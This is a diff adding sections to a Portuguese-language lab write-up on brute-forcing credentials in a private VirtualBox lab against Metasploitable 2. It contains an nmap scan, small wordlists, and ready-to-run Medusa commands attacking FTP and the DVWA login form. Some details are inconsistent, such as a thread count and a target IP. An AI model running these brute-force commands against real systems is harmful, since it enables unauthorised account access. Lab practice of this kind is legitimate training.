@@ -38,11 +38,64 @@ O ambiente foi estruturado no **Oracle VirtualBox** utilizando uma rede privada 
 
 ### Validação de Conectividade
 ```bash
-ping -c 4 192.168.56.103
-
+ping -c 4 192.168.56.103    
+````
 ---
 
 ## 3. Reconhecimento e Enumeração Inicial
+
+Antes de iniciar os testes de autenticação, foi realizada uma varredura de portas e serviços ativos no alvo utilizando o Nmap para confirmar a disponibilidade dos vetores:   
+
+```bash
+nmap -sV -p 21,22,80,445,139 192.168.56.103
+````
+Principais serviços identificados:
+Porta 21/TCP: vsftpd 2.3.4 (FTP)
+Porta 22/TCP: (SSH)
+Porta 80/TCP: Apache httpd 2.2.8 (Hospedando o DVWA)
+Portas 139 e 445/TCP: Samba smbd 3.X - 4.X (SMB)
+
+---
+
+## 4. Preparação das WordlistsPara simular cenários realistas de auditoria controlada sem gerar sobrecarga desnecessária no ambiente, foram criadas listas personalizadas enxutas na pasta /wordlists contendo usuários e senhas comuns misturados às credenciais do ambiente de teste.   
+
+wordlists - users.txt
+user\msfadmin\admin\root
+
+wordlists - pass.txt
+123456\password\qwerty\msfadmin
+
+---
+
+## 5. Cenário 1: Força Bruta no Serviço FTP, neste cenário, o objetivo foi testar múltiplas combinações de usuários e senhas simultaneamente contra o daemon FTP utilizando o módulo ftp do Medusa.   
+
+Comando Executado
+```Bash
+medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6
+```
+-h: IP do host alvo.
+-U: Arquivo contendo a lista de usuários.
+-P: Arquivo contendo a lista de senhas.
+-M ftp: Módulo correspondente ao protocolo FTP.
+-t 4: Número de threads simultâneas.
+
+Validação do Acesso
+Após o Medusa identificar o par de credenciais válido (ACCOUNT FOUND), o acesso foi confirmado via cliente FTP nativo:
+```Bash
+ftp 192.168.56.102
+# Inserir usuário e senha encontrados
+```
+---
+
+## 6. Cenário 2: Automação de Login em Formulário Web (DVWA)Para simular ataques contra aplicações web, foi utilizada a aplicação DVWA (Damn Vulnerable Web Application) hospedada no Metasploitable 2 (http://192.168.56.103/dvwa).
+
+```Bash
+medusa -h 192.168.56.103 -U users.txt -P pass.txt -M http \
+-m PAGE:"/dvwa/login.php" \
+-m FORM:"username=^USER^&password=^PASS^&Login=Login" \
+-m 'FAIL=Login failed' -t 6 \
+```
+---
 
 
 
